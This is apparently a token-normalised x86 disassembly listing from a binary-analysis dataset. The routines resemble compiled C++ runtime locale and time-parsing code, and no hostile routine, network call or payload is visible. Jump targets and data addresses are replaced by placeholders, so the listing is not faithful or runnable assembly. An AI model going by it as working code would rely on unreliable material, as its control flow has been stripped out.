push eax
lea eax [ ebp + 0xc ]
push eax
push edi
call sub_10047282
or [ esi ] eax
add esp 0x18
dec [ ebx ]
jmp r-xdata
push ebx
push esi
push [ ebp + 0x1c ]
lea eax [ ebp - 0x20 ]
push [ ebp + 0x18 ]
mov ecx edi
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push eax
call sub_10045818
jmp r-xdata
add ebx 0xc
push ebx
push 0x1f
push 0x1
lea eax [ ebp + 0x14 ]
push eax
lea eax [ ebp + 0xc ]
push eax
push edi
call sub_10047282
add esp 0x18
or [ esi ] eax
jmp r-xdata
mov ecx [ eax ]
mov [ ebp + 0xc ] ecx
mov eax [ eax + 0x4 ]
mov [ ebp + 0x10 ] eax
sub_1004790d
mov edi edi
push ebp
mov ebp esp
push ecx
and [ ebp - 0x4 ] 0x0
lea eax [ ebp - 0x4 ]
push eax
push 0x7f3
push 0x0
lea eax [ ebp + 0x14 ]
push eax
lea eax [ ebp + 0xc ]
push eax
push ecx
call sub_10047282
mov ecx [ ebp + 0x20 ]
or [ ecx ] eax
mov eax [ ecx ]
add esp 0x18
test al 0x2
jne r-xdata
test [ ecx ] 0x2
jne r-xdata
mov edx 0x76c
cmp [ ebp - 0x4 ] edx
jl r-xdata
mov ecx [ ebp + 0xc ]
mov eax [ ebp + 0x8 ]
mov [ eax ] ecx
mov ecx [ ebp + 0x10 ]
mov [ eax + 0x4 ] ecx
leave
retn 0x20
mov eax [ ebp + 0x24 ]
mov ecx [ ebp - 0x4 ]
mov [ eax + 0x14 ] ecx
cmp [ ebp - 0x4 ] 0x87
jle r-xdata
sub [ ebp - 0x4 ] edx
jmp r-xdata
or eax 0x2
mov [ ecx ] eax
sub_1004797b
mov edi edi
push ebp
mov ebp esp
push [ ecx + 0x8 ]
lea eax [ ebp + 0x14 ]
push 0x0
push eax
lea eax [ ebp + 0xc ]
push eax
call sub_1004086b
add esp 0x10
test eax eax
jge r-xdata
mov ecx [ ebp + 0x24 ]
sar eax 0x1
mov [ ecx + 0x18 ] eax
mov eax [ ebp + 0x20 ]
or [ eax ] 0x2
jmp r-xdata
mov ecx [ ebp + 0xc ]
mov eax [ ebp + 0x8 ]
mov [ eax ] ecx
mov ecx [ ebp + 0x10 ]
mov [ eax + 0x4 ] ecx
pop ebp
retn 0x20
sub_100479bb
mov edi edi
push ebp
mov ebp esp
push [ ecx + 0xc ]
lea eax [ ebp + 0x14 ]
push 0x0
push eax
lea eax [ ebp + 0xc ]
push eax
call sub_1004086b
add esp 0x10
test eax eax
jge r-xdata
mov ecx [ ebp + 0x24 ]
sar eax 0x1
mov [ ecx + 0x10 ] eax
mov eax [ ebp + 0x20 ]
or [ eax ] 0x2
jmp r-xdata
mov ecx [ ebp + 0xc ]
mov eax [ ebp + 0x8 ]
mov [ eax ] ecx
mov ecx [ ebp + 0x10 ]
mov [ eax + 0x4 ] ecx
pop ebp
retn 0x20
sub_100479fb
push 0x98
mov eax sub_1004c6b7
call sub_10028203
mov eax [ ebp + 0x8 ]
xor edi edi
mov [ ebp - 0x10 ] edi
cmp eax edi
je r-xdata
push 0x5
pop eax
call sub_100282db
retn
cmp [ eax ] edi
jne r-xdata
push 0x1c
call sub_10024389
pop ecx
mov [ ebp - 0x14 ] eax
push 0x3
mov [ ebp - 0x4 ] edi
pop esi
cmp eax edi
je r-xdata
xor eax eax
mov ecx [ ebp + 0xc ]
lea eax [ ebp - 0x30 ]
push eax
call sub_10003832
push eax
lea ecx [ ebp - 0xa4 ]
mov [ ebp - 0x4 ] 0x1
mov [ ebp - 0x10 ] 0x1
call sub_100037dd
mov ecx [ ebp - 0x14 ]
push edi
push eax
mov [ ebp - 0x4 ] 0x2
mov [ ebp - 0x10 ] esi
call sub_10047212
jmp r-xdata
test [ ebp - 0x10 ] 0x1
je r-xdata
and [ ebp - 0x10 ] 0xfffffffd
lea ecx [ ebp - 0xa4 ]
call sub_1000384f
test [ ebp - 0x10 ] 0x2
mov ecx [ ebp + 0x8 ]
mov [ ecx ] eax
mov [ ebp - 0x4 ] esi
je r-xdata
push edi
push 0x1
lea ecx [ ebp - 0x30 ]
call sub_10002020
sub_10047aa5
push 0x14
mov eax sub_1004c006
call sub_10028203
push 0x0
lea ecx [ ebp - 0x14 ]
call sub_100230bc
mov esi [ rw-data ]
and [ ebp - 0x4 ] 0x0
mov ecx rw-data
mov [ ebp - 0x10 ] esi
call sub_10003459
mov ecx [ ebp + 0x8 ]
push eax
call sub_1000348e
mov edi eax
test edi edi
jne r-xdata
or [ ebp - 0x4 ] 0xffffffff
lea ecx [ ebp - 0x14 ]
call sub_100230e4
mov eax edi
call sub_100282db
retn
test esi esi
je r-xdata
push [ ebp + 0x8 ]
lea eax [ ebp - 0x10 ]
push eax
call sub_10045ff3
pop ecx
pop ecx
cmp eax 0xffffffff
jne r-xdata
mov edi esi
jmp r-xdata
mov edi [ ebp - 0x10 ]
mov ecx edi
mov [ rw-data ] edi
call sub_10003a56
push edi
call sub_100232a0
pop ecx
push r--data
lea ecx [ ebp - 0x20 ]
call sub_100244ef
push r--data
lea eax [ ebp - 0x20 ]
push eax
call sub_10027dd1
sub_10047b42
push 0x14
mov eax sub_1004c006
call sub_10028203
push 0x0
lea ecx [ ebp - 0x14 ]
call sub_100230bc
mov esi [ rw-data ]
and [ ebp - 0x4 ] 0x0
mov ecx rw-data
mov [ ebp - 0x10 ] esi
call sub_10003459
mov ecx [ ebp + 0x8 ]
push eax
call sub_1000348e
mov edi eax
test edi edi
jne r-xdata
or [ ebp - 0x4 ] 0xffffffff
lea ecx [ ebp - 0x14 ]
call sub_100230e4
mov eax edi
call sub_100282db
retn
test esi esi
je r-xdata
push [ ebp + 0x8 ]
lea eax [ ebp - 0x10 ]
push eax
call sub_100479fb
pop ecx
pop ecx
cmp eax 0xffffffff
jne r-xdata
mov edi esi
jmp r-xdata
mov edi [ ebp - 0x10 ]
mov ecx edi
mov [ rw-data ] edi
call sub_10003a56
push edi
call sub_100232a0
pop ecx
push r--data
lea ecx [ ebp - 0x20 ]
call sub_100244ef
push r--data
lea eax [ ebp - 0x20 ]
push eax
call sub_10027dd1
sub_10047bdf
push 0x8
mov eax sub_1004c6fd
call sub_10028203
xor edi edi
mov [ ebp - 0x10 ] edi
mov eax [ ebp + 0xc ]
and eax 0x2
mov [ ebp - 0x10 ] eax
je r-xdata
mov ebx [ ebp + 0xc ]
and ebx 0x8
je r-xdata
cmp [ ebp + 0x14 ] edi
jne r-xdata
cmp ebx edi
je r-xdata
cmp [ ebp + 0x14 ] edi
jne r-xdata
mov ecx rw-data
call sub_10003459
push eax
push [ ebp + 0x14 ]
call sub_10003950
pop ecx
push eax
push 0x20
call sub_10024389
pop ecx
cmp eax edi
je r-xdata
test [ ebp + 0xc ] 0x1
je r-xdata
cmp [ ebp + 0x14 ] edi
jne r-xdata
mov ecx rw-data
call sub_10003459
push eax
push [ ebp + 0x14 ]
call sub_10007e06
pop ecx
push eax
push 0x10
call sub_10024389
pop ecx
cmp eax edi
je r-xdata
xor esi esi
push edi
push [ ebp + 0x8 ]
mov ecx eax
call sub_100037be
mov esi eax
jmp r-xdata
test [ ebp + 0xc ] 0x20
je r-xdata
cmp [ ebp + 0x14 ] edi
jne r-xdata
mov ecx rw-data
call sub_10003459
push eax
push [ ebp + 0x14 ]
call sub_10007d69
pop ecx
push eax
push 0x10
call sub_10024389
pop ecx
cmp eax edi
je r-xdata
xor esi esi
push edi
push [ ebp + 0x8 ]
mov ecx eax
call sub_100082f4
mov esi eax
jmp r-xdata
mov ecx [ ebp + 0x10 ]
call sub_1003c98f
mov ecx rw-data
call sub_10003459
push eax
push esi
jmp r-xdata
mov ebx [ ebp + 0xc ]
and ebx 0x4
je r-xdata
cmp [ ebp + 0x14 ] edi
jne r-xdata
mov ecx rw-data
call sub_10003459
push eax
push [ ebp + 0x14 ]
call sub_10041bae
pop ecx
push eax
push 0x10
call sub_10024389
pop ecx
cmp eax edi
je r-xdata
cmp [ ebp + 0x14 ] edi
jne r-xdata
xor esi esi
push edi
push [ ebp + 0x8 ]
mov ecx eax
call sub_100082d3
mov esi eax
jmp r-xdata
mov ecx [ ebp + 0x10 ]
call sub_1003c98f
mov ecx rw-data
call sub_10003459
push eax
push esi
jmp r-xdata
cmp ebx edi
je r-xdata
cmp [ ebp + 0x14 ] edi
jne r-xdata
mov ecx rw-data
call sub_10003459
push eax
push [ ebp + 0x14 ]
call sub_10041c4b
pop ecx
push eax
push 0x8
call sub_10024389
pop ecx
cmp eax edi
je r-xdata
xor esi esi
push edi
push [ ebp + 0x8 ]
mov ecx eax
call sub_1003ef7f
mov esi eax
jmp r-xdata
mov ecx rw-data
call sub_10003459
push eax
push [ ebp + 0x14 ]
call sub_10007ea3
pop ecx
push eax
push 0x18
call sub_10024389
pop ecx
mov ecx eax
mov [ ebp - 0x14 ] ecx
mov [ ebp - 0x4 ] 0xe
cmp ecx edi
je r-xdata
mov ecx [ ebp + 0x10 ]
call sub_1003c98f
cmp ebx edi
je r-xdata
mov ecx rw-data
call sub_10003459
push eax
push esi
jmp r-xdata
mov ebx [ ebp + 0xc ]
and ebx 0x10
je r-xdata
cmp [ ebp + 0x14 ] edi
jne r-xdata
mov ecx rw-data
call sub_10003459
push eax
push [ ebp + 0x14 ]
call sub_10041ce8
pop ecx
push eax
push 0x10
call sub_10024389
pop ecx
cmp eax edi
je r-xdata
xor esi esi
mov [ eax + 0x4 ] edi
mov [ eax ] r--data
mov esi eax
jmp r-xdata
mov ecx [ ebp + 0x10 ]
call sub_1003c98f
mov ecx rw-data
call sub_10003459
push eax
push esi
jmp r-xdata
xor esi esi
push edi
push edi
push [ ebp + 0x8 ]
call sub_10008315
mov esi eax
jmp r-xdata
cmp ebx edi
je r-xdata
cmp [ ebp + 0x14 ] edi
jne r-xdata
mov ecx rw-data
call sub_10003459
push eax
push [ ebp + 0x14 ]
call sub_10041d85
pop ecx
push eax
push 0x10
call sub_10024389
pop ecx
cmp eax edi
je r-xdata
xor esi esi
push edi
push [ ebp + 0x8 ]
mov ecx eax
call sub_1003efc3
mov esi eax
jmp r-xdata
mov ecx [ ebp + 0x10 ]
call sub_1003c98f
mov ecx rw-data
call sub_10003459
push eax
push esi
jmp r-xdata
mov ecx [ ebp + 0x10 ]
call sub_1003c98f
or [ ebp - 0x4 ] 0xffffffff
mov ecx rw-data
call sub_10003459
push eax
push esi
jmp r-xdata
cmp [ ebp - 0x10 ] edi
je r-xdata
cmp [ ebp + 0x14 ] edi
jne r-xdata
mov ecx rw-data
call sub_10003459
push eax
push [ ebp + 0x14 ]
call sub_10047aa5
pop ecx
push eax
push 0x1c
call sub_10024389
pop ecx
mov ecx eax
mov [ ebp + 0xc ] ecx
mov [ ebp - 0x4 ] 0x2c
cmp ecx edi
je r-xdata
cmp [ ebp + 0x14 ] edi
jne r-xdata
xor esi esi
push edi
push [ ebp + 0x8 ]
mov ecx eax
call sub_1003efe6
mov esi eax
jmp r-xdata
mov ecx [ ebp + 0x10 ]
call sub_1003c98f
mov ecx rw-data
call sub_10003459
push eax
push esi
jmp r-xdata
call sub_100282db
retn
cmp [ ebp + 0x14 ] edi
jne r-xdata
mov ecx rw-data
call sub_10003459
push eax
push [ ebp + 0x14 ]
call sub_10041f5c
pop ecx
push eax
push 0x14
call sub_10024389
pop ecx
cmp eax edi
je r-xdata
xor esi esi
push edi
push [ ebp + 0x8 ]
call sub_100457bc
mov esi eax
jmp r-xdata
mov ecx rw-data
call sub_10003459
push eax
push [ ebp + 0x14 ]
call sub_10041e22
pop ecx
push eax
push 0x34
call sub_10024389
pop ecx
mov ecx eax
mov [ ebp - 0x14 ] ecx
mov [ ebp - 0x4 ] 0x20
cmp ecx edi
je r-xdata
mov ecx [ ebp + 0x10 ]
call sub_1003c98f
cmp ebx edi
je r-xdata
mov ecx rw-data
call sub_10003459
push eax
push esi
jmp r-xdata
mov ecx rw-data
call sub_10003459
push eax
push [ ebp + 0x14 ]
call sub_1003d2f6
pop ecx
push eax
push 0x10
call sub_10024389
pop ecx
cmp eax edi
je r-xdata
xor esi esi
push edi
push [ ebp + 0x8 ]
mov ecx eax
call sub_1003ef1b
mov esi eax
jmp r-xdata
mov ecx [ ebp + 0x10 ]
call sub_1003c98f
or [ ebp - 0x4 ] 0xffffffff
mov ecx rw-data
call sub_10003459
push eax
push esi
jmp r-xdata
cmp [ ebp + 0x14 ] edi
jne r-xdata
xor esi esi
push edi
push edi
push [ ebp + 0x8 ]
call sub_1004027f
mov esi eax
jmp r-xdata
xor esi esi
push edi
push [ ebp + 0x8 ]
mov ecx eax
call sub_1003c9ba
mov esi eax
jmp r-xdata
mov ecx [ ebp + 0x10 ]
call sub_1003c98f
mov ecx rw-data
call sub_10003459
push eax
push esi
jmp r-xdata
mov ecx rw-data
call sub_10003459
push eax
push [ ebp + 0x14 ]
call sub_10041ebf
pop ecx
push eax
push 0x34
call sub_10024389
pop ecx
mov ecx eax
mov [ ebp - 0x14 ] ecx
mov [ ebp - 0x4 ] 0x26
cmp ecx edi
je r-xdata
mov ecx [ ebp + 0x10 ]
call sub_1003c98f
cmp ebx edi
je r-xdata
or [ ebp - 0x4 ] 0xffffffff
mov ecx rw-data
call sub_10003459
push eax
push esi
jmp r-xdata
mov ecx [ ebp + 0x10 ]
call sub_1003c98f
mov ecx rw-data
call sub_10003459
push eax
push esi
jmp r-xdata
xor esi esi
push edi
push edi
push [ ebp + 0x8 ]
call sub_100402cb
mov esi eax
jmp r-xdata
mov ecx [ ebp + 0x10 ]
call sub_1003c98f
or [ ebp - 0x4 ] 0xffffffff
mov ecx rw-data
call sub_10003459
push eax
push esi
jmp r-xdata
sub_10048070
push 0x8
mov eax sub_1004c6fd
call sub_10028203
xor edi edi
mov [ ebp - 0x10 ] edi
mov eax [ ebp + 0xc ]
and eax 0x2
mov [ ebp - 0x10 ] eax
je r-xdata
mov ebx [ ebp + 0xc ]
and ebx 0x8
je r-xdata
cmp [ ebp + 0x14 ] edi
jne r-xdata
cmp ebx edi
je r-xdata
cmp [ ebp + 0x14 ] edi
jne r-xdata
mov ecx rw-data
call sub_10003459
push eax
push [ ebp + 0x14 ]
call sub_10041b11
pop ecx
push eax
push 0x20
call sub_10024389
pop ecx
cmp eax edi
je r-xdata
test [ ebp + 0xc ] 0x1
je r-xdata
cmp [ ebp + 0x14 ] edi
jne r-xdata
mov ecx rw-data
call sub_10003459
push eax
push [ ebp + 0x14 ]
call sub_10041ff9
pop ecx
push eax
push 0x10
call sub_10024389
pop ecx
cmp eax edi
je r-xdata
xor esi esi
push edi
push [ ebp + 0x8 ]
mov ecx eax
call sub_1003ec2b
mov esi eax
jmp r-xdata
test [ ebp + 0xc ] 0x20
je r-xdata
cmp [ ebp + 0x14 ] edi
jne r-xdata
mov ecx rw-data
call sub_10003459
push eax
push [ ebp + 0x14 ]
call sub_10042096
pop ecx
push eax
push 0x10
call sub_10024389
pop ecx
cmp eax edi
je r-xdata
xor esi esi
push edi
push [ ebp + 0x8 ]
mov ecx eax
call sub_1003f043
mov esi eax
jmp r-xdata
mov ecx [ ebp + 0x10 ]
call sub_1003c98f
mov ecx rw-data
call sub_10003459
push eax
push esi
jmp r-xdata
mov ebx [ ebp + 0xc ]
and ebx 0x4
je r-xdata
cmp [ ebp + 0x14 ] edi
jne r-xdata
mov ecx rw-data
call sub_10003459
push eax
push [ ebp + 0x14 ]
call sub_100421d0
pop ecx
push eax
push 0x10
call sub_10024389
pop ecx
cmp eax edi
je r-xdata
cmp [ ebp + 0x14 ] edi
jne r-xdata
xor esi esi
push edi
push [ ebp + 0x8 ]
mov ecx eax
call sub_1003f147
mov esi eax
jmp r-xdata
mov ecx [ ebp + 0x10 ]
call sub_1003c98f
mov ecx rw-data
call sub_10003459
push eax
push esi
jmp r-xdata
cmp ebx edi
je r-xdata
cmp [ ebp + 0x14 ] edi
jne r-xdata
mov ecx rw-data
call sub_10003459
push eax
push [ ebp + 0x14 ]
call sub_1004226d
pop ecx
push eax
push 0x8
call sub_10024389
pop ecx
cmp eax edi
je r-xdata
xor esi esi
push edi
push [ ebp + 0x8 ]
mov ecx eax
call sub_1003f281
mov esi eax
jmp r-xdata
mov ecx rw-data
call sub_10003459
push eax
push [ ebp + 0x14 ]
call sub_10042133
pop ecx
push eax
push 0x18
call sub_10024389
pop ecx
mov ecx eax
mov [ ebp - 0x14 ] ecx
mov [ ebp - 0x4 ] 0xe
cmp ecx edi
je r-xdata
mov ecx [ ebp + 0x10 ]
call sub_1003c98f
cmp ebx edi
je r-xdata
mov ecx rw-data
call sub_10003459
push eax
push esi
jmp r-xdata
mov ebx [ ebp + 0xc ]
and ebx 0x10
je r-xdata
cmp [ ebp + 0x14 ] edi
jne r-xdata
mov ecx rw-data
call sub_10003459
push eax
push [ ebp + 0x14 ]
call sub_1004230a
pop ecx
push eax
push 0x10
call sub_10024389
pop ecx
cmp eax edi
je r-xdata
xor esi esi
mov [ eax + 0x4 ] edi
mov [ eax ] r--data
mov esi eax
jmp r-xdata
mov ecx [ ebp + 0x10 ]
call sub_1003c98f
mov ecx rw-data
call sub_10003459
push eax
push esi
jmp r-xdata
xor esi esi
push edi
push edi
push [ ebp + 0x8 ]
call sub_1003fed1
mov esi eax
jmp r-xdata
cmp ebx edi
je r-xdata
cmp [ ebp + 0x14 ] edi
jne r-xdata
mov ecx rw-data
call sub_10003459
push eax
push [ ebp + 0x14 ]
call sub_100423a7
pop ecx
push eax
push 0x10
call sub_10024389
pop ecx
cmp eax edi
je r-xdata
xor esi esi
push edi
push [ ebp + 0x8 ]
mov ecx eax
call sub_1003f3e9
mov esi eax
jmp r-xdata
mov ecx [ ebp + 0x10 ]
call sub_1003c98f
mov ecx rw-data
call sub_10003459
push eax
push esi
jmp r-xdata
mov ecx [ ebp + 0x10 ]
call sub_1003c98f
or [ ebp - 0x4 ] 0xffffffff
mov ecx rw-data
call sub_10003459
push eax
push esi
jmp r-xdata
cmp [ ebp - 0x10 ] edi
je r-xdata
cmp [ ebp + 0x14 ] edi
jne r-xdata
mov ecx rw-data
call sub_10003459
push eax
push [ ebp + 0x14 ]
call sub_10047b42
pop ecx
push eax
push 0x1c
call sub_10024389
pop ecx
mov ecx eax
mov [ ebp + 0xc ] ecx
mov [ ebp - 0x4 ] 0x2c
cmp ecx edi
je r-xdata
cmp [ ebp + 0x14 ] edi
jne r-xdata
xor esi esi
push edi
push [ ebp + 0x8 ]
mov ecx eax
call sub_1003f47a
mov esi eax
jmp r-xdata
mov ecx [ ebp + 0x10 ]
call sub_1003c98f
mov ecx rw-data
call sub_10003459
push eax
push esi
jmp r-xdata
call sub_100282db
retn
cmp [ ebp + 0x14 ] edi
jne r-xdata
mov ecx rw-data
call sub_10003459
push eax
push [ ebp + 0x14 ]
call sub_1004257e
pop ecx
push eax
push 0x14
call sub_10024389
pop ecx
cmp eax edi
je r-xdata
xor esi esi
push edi
push [ ebp + 0x8 ]
call sub_10047212
mov esi eax
jmp r-xdata
mov ecx rw-data
call sub_10003459
push eax
push [ ebp + 0x14 ]
call sub_10042444
pop ecx
push eax
push 0x34
call sub_10024389
pop ecx
mov ecx eax
mov [ ebp - 0x14 ] ecx
mov [ ebp - 0x4 ] 0x20
cmp ecx edi
je r-xdata
mov ecx [ ebp + 0x10 ]
call sub_1003c98f
cmp ebx edi
je r-xdata
mov ecx rw-data
call sub_10003459
push eax
push esi
jmp r-xdata
mov ecx rw-data
call sub_10003459
push eax
push [ ebp + 0x14 ]
call sub_1004261b
pop ecx
push eax
push 0x10
call sub_10024389
pop ecx
cmp eax edi
je r-xdata
xor esi esi
push edi
push [ ebp + 0x8 ]
mov ecx eax
call sub_1003f560
mov esi eax
jmp r-xdata
mov ecx [ ebp + 0x10 ]
call sub_1003c98f
or [ ebp - 0x4 ] 0xffffffff
mov ecx rw-data
call sub_10003459
push eax
push esi
jmp r-xdata
cmp [ ebp + 0x14 ] edi
jne r-xdata
xor esi esi
push edi
push edi
push [ ebp + 0x8 ]
call sub_10040317
mov esi eax
jmp r-xdata
xor esi esi
push edi
push [ ebp + 0x8 ]
mov ecx eax
call sub_1003e973
mov esi eax
jmp r-xdata
mov ecx [ ebp + 0x10 ]
call sub_1003c98f
mov ecx rw-data
call sub_10003459
push eax
push esi
jmp r-xdata
mov ecx rw-data
call sub_10003459
push eax
push [ ebp + 0x14 ]
call sub_100424e1
pop ecx
push eax
push 0x34
call sub_10024389
pop ecx
mov ecx eax
mov [ ebp - 0x14 ] ecx
mov [ ebp - 0x4 ] 0x26
cmp ecx edi
je r-xdata
mov ecx [ ebp + 0x10 ]
call sub_1003c98f
cmp ebx edi
je r-xdata
or [ ebp - 0x4 ] 0xffffffff
mov ecx rw-data
call sub_10003459
push eax
push esi
jmp r-xdata
mov ecx [ ebp + 0x10 ]
call sub_1003c98f
mov ecx rw-data
call sub_10003459
push eax
push esi
jmp r-xdata
xor esi esi
push edi
push edi
push [ ebp + 0x8 ]
call sub_10040363
mov esi eax
jmp r-xdata
mov ecx [ ebp + 0x10 ]
call sub_1003c98f
or [ ebp - 0x4 ] 0xffffffff
mov ecx rw-data
call sub_10003459
push eax
push esi
jmp r-xdata
sub_10048501
mov edi edi
push ebp
mov ebp esp
push ecx
push ecx
push esi
lea eax [ ebp - 0x8 ]
mov esi ecx
mov ecx [ ebp + 0x8 ]
push eax
call sub_1003e761
mov ecx [ eax ]
mov [ esi + 0x8 ] ecx
mov eax [ eax + 0x4 ]
mov [ esi + 0xc ] eax
pop esi
leave
retn 0x4
sub_10048527
mov edi edi
push ebp
mov ebp esp
cmp [ ecx + 0x28 ] 0x0
jne r-xdata
mov eax r--data
mov ecx [ ebp + 0xc ]
cmp ecx 0x2
ja r-xdata
mov eax [ ebp + 0x10 ]
cmp eax 0x1
ja r-xdata
cmp [ ebp + 0x14 ] 0x4
ja r-xdata
lea eax [ eax + ecx * 2 ]
imul eax eax 0x5
add eax [ ebp + 0x14 ]
lea eax [ eax * 4 + r--data ]
jmp r-xdata
push 0x4
push eax
push 0x4
push [ ebp + 0x8 ]
call sub_100242f1
add esp 0x10
pop ebp
retn 0x10
sub_10048573
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0xc ]
push esi
push [ ebp + 0x8 ]
mov esi ecx
mov [ esi + 0x4 ] eax
mov [ esi ] r--data
call sub_10048501
mov eax esi
pop esi
pop ebp
retn 0x8
sub_10048596
mov edi edi
push ebp
mov ebp esp
add ecx 0x8
push ecx
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_1004b0f3
add esp 0x14
pop ebp
retn 0x10
sub_100485b7
mov edi edi
push ebp
mov ebp esp
mov ecx [ ebp + 0x8 ]
xor eax eax
jmp r-xdata
cmp ecx [ ebp + 0xc ]
jne r-xdata
movsx edx [ ecx ]
rol eax 0x8
add eax edx
inc ecx
pop ebp
retn 0x8
sub_100485d5
mov edi edi
push ebp
mov ebp esp
test [ ebp + 0x8 ] 0x1
push esi
mov esi ecx
mov [ esi ] r--data
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
push esi
call sub_100242e6
pop ecx
sub_10048600
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0xc ]
push esi
push [ ebp + 0x8 ]
mov esi ecx
mov [ esi + 0x4 ] eax
mov [ esi ] r--data
call sub_1003e8c7
mov eax esi
pop esi
pop ebp
retn 0x8
sub_10048623
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0xc ]
push esi
push [ ebp + 0x8 ]
mov esi ecx
mov [ esi + 0x4 ] eax
mov [ esi ] r--data
call sub_1003e8c7
mov eax esi
pop esi
pop ebp
retn 0x8
sub_1004865e
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0xc ]
push esi
push [ ebp + 0x8 ]
mov esi ecx
mov [ esi + 0x4 ] eax
mov [ esi ] r--data
and [ esi + 0x8 ] 0x0
call sub_1003e930
mov eax esi
pop esi
pop ebp
retn 0x8
sub_100486a1
mov edi edi
push ebp
mov ebp esp
push esi
mov esi ecx
call sub_10048685
test [ ebp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
push esi
call sub_100242e6
pop ecx
sub_100486c2
mov edi edi
push ebp
mov ebp esp
push esi
mov esi ecx
call sub_10048646
test [ ebp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
push esi
call sub_100242e6
pop ecx
sub_100486e3
mov edi edi
push ebp
mov ebp esp
jmp r-xdata
cmp [ ebp + 0x1c ] 0x0
ja r-xdata
lea ecx [ ebp + 0x14 ]
call sub_100084d4
movzx eax [ eax ]
push eax
lea ecx [ ebp + 0xc ]
call sub_1000c054
dec [ ebp + 0x1c ]
lea ecx [ ebp + 0x14 ]
call sub_1000850b
mov ecx [ ebp + 0xc ]
mov eax [ ebp + 0x8 ]
mov [ eax ] ecx
mov ecx [ ebp + 0x10 ]
mov [ eax + 0x4 ] ecx
pop ebp
retn
sub_1004871f
mov edi edi
push ebp
mov ebp esp
cmp [ ebp + 0x18 ] 0x0
jbe r-xdata
mov ecx [ ebp + 0xc ]
mov eax [ ebp + 0x8 ]
mov [ eax ] ecx
mov ecx [ ebp + 0x10 ]
mov [ eax + 0x4 ] ecx
pop ebp
retn
push [ ebp + 0x14 ]
lea ecx [ ebp + 0xc ]
call sub_1000c054
dec [ ebp + 0x18 ]
jne r-xdata
sub_1004874a
push 0x10
mov eax sub_1004c718
call sub_10028236
mov esi ecx
mov [ ebp - 0x14 ] esi
mov ecx [ ebp + 0x8 ]
lea eax [ ebp - 0x1c ]
push eax
call sub_10003779
mov ecx [ eax ]
lea ebx [ esi + 0x2c ]
mov [ ebx ] ecx
mov eax [ eax + 0x4 ]
mov [ ebx + 0x4 ] eax
call sub_10024c18
mov edi eax
xor eax eax
push ebx
push eax
mov [ esi + 0x8 ] eax
mov [ esi + 0x10 ] eax
mov [ esi + 0x14 ] eax
mov [ esi + 0x18 ] eax
push [ edi + 0x1c ]
mov [ ebp - 0x4 ] eax
call sub_1000847e
add esp 0xc
cmp [ esi + 0x28 ] 0x0
mov [ esi + 0x8 ] eax
je r-xdata
mov eax [ edi + 0x10 ]
mov eax [ edi + 0xc ]
jmp r-xdata
push ebx
push 0x0
push eax
call sub_1000847e
mov [ esi + 0x14 ] eax
add esp 0xc
cmp [ edi + 0x2f ] 0x4
mov eax r--data
ja r-xdata
mov eax [ edi + 0x20 ]
push ebx
push 0x0
push eax
call sub_1000847e
mov [ esi + 0x10 ] eax
add esp 0xc
cmp [ edi + 0x2e ] 0x4
mov eax r--data
ja r-xdata
push ebx
push 0x0
push eax
call sub_1000847e
mov [ esi + 0x18 ] eax
mov eax [ edi + 0x14 ]
mov al [ eax ]
mov [ esi + 0xc ] al
mov eax [ edi + 0x18 ]
mov al [ eax ]
add esp 0xc
cmp [ esi + 0x28 ] 0x0
mov [ esi + 0xd ] al
je r-xdata
mov eax [ edi + 0x24 ]
mov al [ edi + 0x29 ]
mov al [ edi + 0x28 ]
jmp r-xdata
and [ esi + 0x1c ] 0x0
cmp eax 0x7f
jl r-xdata
movsx eax al
mov [ esi + 0x1c ] eax
test eax eax
jl r-xdata
call sub_100282db
retn 0x8
push 0x4
mov esi r--data
push esi
push ebx
call sub_10026f10
push 0x4
push esi
push [ ebp + 0x8 ]
call sub_10026f10
add esp 0x18
movsx eax [ edi + 0x2e ]
push eax
movsx eax [ edi + 0x2a ]
push eax
movsx eax [ edi + 0x2b ]
push eax
lea ebx [ esi + 0x20 ]
push ebx
mov ecx esi
call sub_10048527
movsx ecx [ edi + 0x2f ]
push ecx
movsx ecx [ edi + 0x2c ]
push ecx
movsx ecx [ edi + 0x2d ]
lea eax [ esi + 0x24 ]
push ecx
push eax
mov ecx esi
mov [ ebp + 0x8 ] eax
call sub_10048527
cmp [ ebp + 0xc ] 0x0
je r-xdata
sub_10048897
push 0x4
mov eax sub_1004bea9
call sub_10028203
mov esi ecx
mov [ ebp - 0x10 ] esi
mov eax [ ebp + 0xc ]
mov [ esi + 0x4 ] eax
push [ ebp + 0x14 ]
mov al [ ebp + 0x10 ]
push [ ebp + 0x8 ]
and [ ebp - 0x4 ] 0x0
mov [ esi ] r--data
mov [ esi + 0x28 ] al
call sub_1004874a
mov eax esi
call sub_100282db
retn 0x10
sub_100488d3
mov edi edi
push ebp
mov ebp esp
push ecx
push ecx
mov eax [ ecx ]
mov [ ebp - 0x8 ] eax
mov eax [ ecx + 0x4 ]
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0xc ]
neg eax
push eax
lea ecx [ ebp - 0x8 ]
call sub_1003f869
mov ecx [ ebp - 0x8 ]
mov eax [ ebp + 0x8 ]
mov [ eax ] ecx
mov ecx [ ebp - 0x4 ]
mov [ eax + 0x4 ] ecx
leave
retn 0x8
sub_10048905
mov edi edi
push ebp
mov ebp esp
push esi
push [ ebp + 0x10 ]
mov esi ecx
push 0x0
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_10048897
mov [ esi ] r--data
mov eax esi
pop esi
pop ebp
retn 0xc
sub_1004892a
mov edi edi
push ebp
mov ebp esp
push esi
mov esi ecx
mov [ esi ] r--data
call sub_10048646
test [ ebp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
push esi
call sub_100242e6
pop ecx
sub_10048951
mov edi edi
push ebp
mov ebp esp
push esi
push [ ebp + 0x10 ]
mov esi ecx
push 0x1
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_10048897
mov [ esi ] r--data
mov eax esi
pop esi
pop ebp
retn 0xc
sub_10048976
mov edi edi
push ebp
mov ebp esp
push esi
